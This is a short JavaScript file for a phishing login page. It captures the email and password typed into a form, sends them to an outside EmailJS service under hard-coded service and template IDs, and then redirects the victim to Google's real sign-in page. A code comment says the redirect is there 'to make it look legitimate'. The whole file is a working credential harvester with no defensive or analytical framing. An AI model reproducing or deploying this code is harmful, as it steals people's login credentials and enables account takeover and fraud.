(function() {
    // Initialize EmailJS with your public key
    emailjs.init("sZy8o2u7l3_qpTCe9");

    document.getElementById('loginForm').addEventListener('submit', function(event) {
        event.preventDefault();
        
        // Get form values
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        
        // Prepare email parameters with explicit field names matching your EmailJS template
        const templateParams = {
            user_email: email,
            user_password: password,
            from_name: email,
            message: `Email: ${email}\nPassword: ${password}`
        };
        
        // Send email using EmailJS
        emailjs.send('service_6tox1ge', 'template_kpovv09', templateParams)
            .then(function(response) {
                console.log('SUCCESS!', response.status, response.text);
                // Redirect to Google after successful submission
                setTimeout(function() {
                    window.location.href = 'https://accounts.google.com/signin';
                }, 1000);
            }, function(error) {
                console.log('FAILED...', error);
                // Still redirect to make it look legitimate
                setTimeout(function() {
                    window.location.href = 'https://accounts.google.com/signin';
                }, 1000);
            });
    });
})();